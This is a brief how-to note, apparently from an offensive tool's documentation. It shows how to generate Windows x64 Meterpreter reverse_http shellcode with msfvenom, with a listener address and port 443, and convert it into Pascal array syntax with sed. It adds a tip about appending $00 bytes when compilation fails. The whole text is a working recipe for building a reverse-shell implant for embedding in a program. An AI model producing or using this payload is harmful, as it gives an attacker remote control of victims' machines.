to generate formatted pascal shellcode using Msfvenom you can achieve that by the exeucting the following command for an example 

```
msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.0.107 LPORT=443 -f c | sed -r 's/[\x]+/$/g' | sed -r 's/[\]+/,/g' | sed -r 's/["]+//g' | sed -e 's/$/\,/' | cut -c 2-
```

if you could face error while compiling the shellcode you can just `$00` at end of generated shellcode, sometime you need `$00,$00`



